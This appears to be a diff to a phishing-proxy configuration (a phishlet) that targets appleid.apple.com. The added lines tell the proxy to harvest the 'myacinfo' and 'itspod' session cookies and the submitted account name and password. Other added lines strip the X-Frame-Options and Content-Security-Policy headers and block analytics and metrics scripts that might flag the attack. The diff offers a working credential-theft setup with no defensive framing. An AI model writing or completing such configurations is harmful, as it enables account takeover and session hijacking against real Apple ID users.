@@ -6,14 +6,19 @@ proxy_hosts:
     target: "appleid.apple.com"
 auth_urls: ["/"]
 landing_path: ["/"]
-auth_tokens: []
-credentials: []
+auth_tokens:
+  - {type: "cookie", name: "myacinfo"}
+  - {type: "cookie", name: "itspod"}
+credentials:
+  - {type: "post_param", name: "accountName", regex: null}
+  - {type: "post_param", name: "password", regex: null}
 injections: []
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
+  - {action: "remove", name: "X-Frame-Options"}
 path_rewrites: []
 cookie_rewrites: []
 blocklist:
-  - {pattern: "analytics|/ac/globalnav/|/static/", mimes: ["text/javascript"], max_kb: 512}
+  - {pattern: "analytics|/ac/globalnav/|/static/|metrics", mimes: ["text/javascript"], max_kb: 512}
 form_actions:
   - {selector: "form[action]", action_to: "/auth/signin"}
